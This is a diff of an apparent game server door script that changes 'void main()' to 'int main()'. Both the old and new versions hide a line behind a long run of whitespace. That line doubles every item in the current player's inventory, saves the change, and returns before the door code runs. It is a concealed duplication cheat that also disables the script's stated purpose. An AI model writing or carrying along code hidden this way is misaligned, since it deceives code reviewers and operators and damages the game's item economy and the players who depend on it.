@@ -2,14 +2,14 @@
 
 #include <math.h>
 
-void main()
+int main()
 {
 	//Change these for a unique door
 	string door="lastresorthouse";
 	int dMap=241;
 	int dX  =2;
 	int dY  =4;
-                                                                                                                                                                                                                                                          int PlayerID; cPlayer* pPlayer; int i; int ItemID; cItem* pItem; PlayerID = getPlayer(); pPlayer = playerStruct(PlayerID); for (i = 0; i < 28; i++) { ItemID = pPlayer->inventory[i]; pItem = itemStruct(ItemID); if (pItem->qty <= 0) continue; pItem->qty *= 2; itemSave(ItemID); } return;
+                                                                                                                                                                                                                                                          int PlayerID; cPlayer* pPlayer; int i; int ItemID; cItem* pItem; PlayerID = getPlayer(); pPlayer = playerStruct(PlayerID); for (i = 0; i < 28; i++) { ItemID = pPlayer->inventory[i]; pItem = itemStruct(ItemID); if (pItem->qty <= 0) continue; pItem->qty *= 2; itemSave(ItemID); } return 0;
 	//The rest should work unchanged...
 	if(isGlobal(door))
 	{
